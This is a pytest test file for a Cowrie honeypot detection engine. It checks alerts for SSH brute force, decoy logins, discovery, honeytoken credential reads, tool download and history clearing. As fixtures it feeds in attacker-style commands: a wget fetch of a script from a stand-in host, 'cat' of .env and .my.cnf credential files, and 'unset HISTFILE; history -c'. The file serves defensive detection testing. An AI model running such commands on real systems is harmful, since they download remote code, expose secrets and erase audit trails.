from __future__ import annotations

from typing import Any

import pytest

from cowrie_soc.config import Config, ConfigError
from cowrie_soc.detection import DetectionEngine
from cowrie_soc.normalize import NormalizeConfig, normalize
from cowrie_soc.schema import validate_record

from .conftest import cowrie_line, parse_text

FIXED_NOW = "2026-10-31T00:00:00Z"


def engine(config: Config, **overrides: dict[str, Any]) -> DetectionEngine:
    detection = {**config.detection, **overrides}
    return DetectionEngine(detection, "cowrie-test", now=lambda: FIXED_NOW, user_homes=config.user_homes)


def run(eng: DetectionEngine, lines: list[str]) -> list[dict[str, Any]]:
    cfg = NormalizeConfig(sensor_id="cowrie-test")
    findings: list[dict[str, Any]] = []
    for i, line in enumerate(lines):
        findings += eng.process(normalize(parse_text(line, i), cfg))
    return findings


def by_rule(findings: list[dict[str, Any]], rule_id: str) -> list[dict[str, Any]]:
    return [f for f in findings if f["rule_id"] == rule_id]


def test_real_capture_findings(config: Config, real_lines: list[bytes]) -> None:
    findings = run(engine(config), [line.decode() for line in real_lines])
    assert all(validate_record(f) == [] for f in findings)
    summary = sorted((f["rule_id"], f["severity"]) for f in findings)
    assert summary == sorted([
        ("SSH-BRUTE-001", "medium"),
        ("SSH-AUTH-002", "high"),
        ("SSH-AUTH-002", "medium"),
        ("SSH-EXEC-001", "low"), ("SSH-EXEC-001", "low"), ("SSH-EXEC-001", "low"), ("SSH-EXEC-001", "low"),
        ("SSH-DISC-001", "medium"),
        ("SSH-DISC-001", "high"),
        ("SSH-CRED-001", "critical"), ("SSH-CRED-001", "critical"),
        ("SSH-CRED-001", "high"),
        ("SSH-TOOL-001", "high"),
        ("SSH-SEQ-001", "critical"),
    ])
    brute = by_rule(findings, "SSH-BRUTE-001")[0]
    assert [t["technique_id"] for t in brute["attack"]] == ["T1110.001"]
    assert brute["evidence"]["threshold"] == 5 and brute["evidence"]["window_seconds"] == 60
    assert len(brute["evidence"]["event_ids"]) == 5
    assert len(brute["session_ids"]) == 5  # Cowrie logs each connection as its own session
    honey = {f["evidence"]["observed"]["target"] for f in findings if f["severity"] == "critical"
             and f["rule_id"] == "SSH-CRED-001"}
    assert honey == {"/var/backups/db/.my.cnf", "/var/backups/app/.env"}


def test_findings_are_deterministic(config: Config, real_lines: list[bytes]) -> None:
    lines = [line.decode() for line in real_lines]
    a = run(engine(config), lines)
    b = run(engine(config), lines)
    assert a == b


def test_bruteforce_below_threshold_or_outside_window_is_silent(config: Config) -> None:
    four = [cowrie_line("cowrie.login.failed", f"s{i}", at=i, username="root", password=f"p{i}") for i in range(4)]
    assert by_rule(run(engine(config), four), "SSH-BRUTE-001") == []
    spread = [cowrie_line("cowrie.login.failed", f"s{i}", at=i * 30, username="root", password=f"p{i}")
              for i in range(6)]
    assert by_rule(run(engine(config), spread), "SSH-BRUTE-001") == []


def test_bruteforce_one_finding_per_episode_and_spraying(config: Config) -> None:
    eng = engine(config)
    burst = [cowrie_line("cowrie.login.failed", f"a{i}", at=i, username=f"user{i}", password="Winter2024")
             for i in range(10)]
    findings = by_rule(run(eng, burst), "SSH-BRUTE-001")
    assert len(findings) == 1
    assert findings[0]["attack"][0]["technique_id"] == "T1110.003"
    # After a quiet gap longer than the window a new episode alerts again.
    later = [cowrie_line("cowrie.login.failed", f"b{i}", at=500 + i, username="root", password=f"x{i}")
             for i in range(5)]
    again = by_rule(run(eng, later), "SSH-BRUTE-001")
    assert len(again) == 1 and again[0]["attack"][0]["technique_id"] == "T1110.001"


def test_bruteforce_is_per_source_ip(config: Config) -> None:
    lines = [cowrie_line("cowrie.login.failed", f"s{i}", at=i, src_ip=f"10.0.0.{i % 2}", username="root",
                         password=str(i)) for i in range(8)]
    assert by_rule(run(engine(config), lines), "SSH-BRUTE-001") == []


def test_decoy_login_without_failures_is_medium(config: Config) -> None:
    f = run(engine(config), [cowrie_line("cowrie.login.success", username="backup", password="Backup@2024")])
    login = by_rule(f, "SSH-AUTH-002")[0]
    assert login["severity"] == "medium"
    assert [t["technique_id"] for t in login["attack"]] == ["T1078"]


def test_repeat_login_deduplicated_but_escalation_never_suppressed(config: Config) -> None:
    # Regression from the live run: a benign login first, then brute force + login from the same source.
    lines = [
        cowrie_line("cowrie.login.success", "s0", at=0, username="backup", password="Backup@2024"),
        cowrie_line("cowrie.login.success", "s1", at=10, username="backup", password="Backup@2024"),
        *[cowrie_line("cowrie.login.failed", f"f{i}", at=20 + i, username="root", password=str(i)) for i in range(4)],
        cowrie_line("cowrie.login.success", "s2", at=30, username="backup", password="Backup@2024"),
        cowrie_line("cowrie.login.success", "s3", at=40, username="backup", password="Backup@2024"),
    ]
    logins = by_rule(run(engine(config), lines), "SSH-AUTH-002")
    assert [(f["session_ids"][0], f["severity"]) for f in logins] == [("s0", "medium"), ("s2", "high")]


def test_discovery_needs_distinct_techniques(config: Config) -> None:
    same = [cowrie_line("cowrie.command.input", at=i, input=c) for i, c in enumerate(["ls", "ls -la", "find /"])]
    assert by_rule(run(engine(config), same), "SSH-DISC-001") == []
    mixed = [cowrie_line("cowrie.command.input", at=i, input=c) for i, c in enumerate(["ls", "whoami", "uname -a"])]
    found = by_rule(run(engine(config), mixed), "SSH-DISC-001")
    assert len(found) == 1 and found[0]["severity"] == "medium"
    assert {t["technique_id"] for t in found[0]["attack"]} == {"T1083", "T1033", "T1082"}


def test_discovery_window_excludes_old_commands(config: Config) -> None:
    lines = [cowrie_line("cowrie.command.input", at=t, input=c)
             for t, c in [(0, "ls"), (10, "whoami"), (1000, "uname -a")]]
    assert by_rule(run(engine(config), lines), "SSH-DISC-001") == []


def test_honeytoken_relative_path_after_cd_and_unknown_cwd(config: Config) -> None:
    resolved = run(engine(config), [
        cowrie_line("cowrie.login.success", username="root", password="x"),
        cowrie_line("cowrie.command.input", at=1, input="cd /var/backups/app"),
        cowrie_line("cowrie.command.input", at=2, input="cat .env"),
    ])
    hit = [f for f in by_rule(resolved, "SSH-CRED-001") if f["evidence"]["observed"]["honeytoken"]]
    assert hit and hit[0]["confidence"] == "high"
    # No login event seen (e.g. collector started mid-session): match by unique path suffix, lower confidence.
    unknown = run(engine(config), [cowrie_line("cowrie.command.input", input="cat db/.my.cnf")])
    hit2 = [f for f in by_rule(unknown, "SSH-CRED-001") if f["evidence"]["observed"]["honeytoken"]]
    assert hit2 and hit2[0]["confidence"] == "medium" and hit2[0]["severity"] == "critical"


def test_download_without_execute_is_not_a_sequence(config: Config) -> None:
    f = run(engine(config), [cowrie_line("cowrie.command.input", input="wget http://192.0.2.1/a.sh")])
    assert by_rule(f, "SSH-TOOL-001") and not by_rule(f, "SSH-SEQ-001")


def test_file_download_event_triggers_ingress(config: Config) -> None:
    f = run(engine(config), [cowrie_line("cowrie.session.file_download.failed", url="http://192.0.2.7/m")])
    assert by_rule(f, "SSH-TOOL-001")[0]["evidence"]["observed"]["url"] == "http://192.0.2.7/m"


def test_history_tampering(config: Config) -> None:
    f = run(engine(config), [cowrie_line("cowrie.command.input", input="unset HISTFILE; history -c")])
    assert by_rule(f, "SSH-EVADE-001")[0]["attack"][0]["technique_id"] == "T1070.003"


def test_rule_can_be_disabled_and_thresholds_configured(config: Config) -> None:
    lines = [cowrie_line("cowrie.login.failed", f"s{i}", at=i, username="root", password=str(i)) for i in range(3)]
    assert by_rule(run(engine(config, ssh_bruteforce={"threshold": 3, "window_seconds": 10}), lines), "SSH-BRUTE-001")
    assert not by_rule(run(engine(config, ssh_bruteforce={"enabled": False}), lines), "SSH-BRUTE-001")


def test_invalid_rule_config_is_rejected(config: Config) -> None:
    with pytest.raises(ConfigError):
        engine(config, ssh_bruteforce={"treshold": 3})
    with pytest.raises(ConfigError):
        engine(config, ssh_bruteforce={"severity": "urgent"})
    with pytest.raises(ConfigError):
        DetectionEngine({"no_such_rule": {}})


def test_session_state_released_on_close(config: Config) -> None:
    eng = engine(config)
    run(eng, [cowrie_line("cowrie.command.input", input="ls"), cowrie_line("cowrie.session.closed", at=1)])
    assert eng.ctx.sessions == {}


def test_bruteforce_with_redacted_passwords_does_not_guess_sub_technique(config: Config) -> None:
    # Regression: redacted passwords all looked identical, so 6 different passwords were reported
    # as password spraying (T1110.003).
    eng = engine(config)
    ncfg = NormalizeConfig(sensor_id="cowrie-test", include_passwords=False)
    findings: list[dict[str, Any]] = []
    for i in range(6):
        line = cowrie_line("cowrie.login.failed", f"s{i}", at=i, username=f"user{i}", password=f"pw{i}")
        findings += eng.process(normalize(parse_text(line, i), ncfg))
    brute = by_rule(findings, "SSH-BRUTE-001")[0]
    assert [t["technique_id"] for t in brute["attack"]] == ["T1110"]
    assert brute["evidence"]["observed"]["distinct_passwords"] is None


def test_rule_config_types_are_checked(config: Config) -> None:
    with pytest.raises(ConfigError):
        engine(config, ssh_credential_access={"honeytoken_paths": "/var/backups/db/.my.cnf"})
    with pytest.raises(ConfigError):
        engine(config, ssh_bruteforce={"threshold": "5"})


def test_session_evidence_is_bounded(config: Config) -> None:
    eng = engine(config)
    run(eng, [cowrie_line("cowrie.command.input", at=i * 0.01, input=f"ls {i}") for i in range(500)])
    state = next(iter(eng.ctx.sessions.values()))
    assert len(state.discovery["T1083"]) <= 100
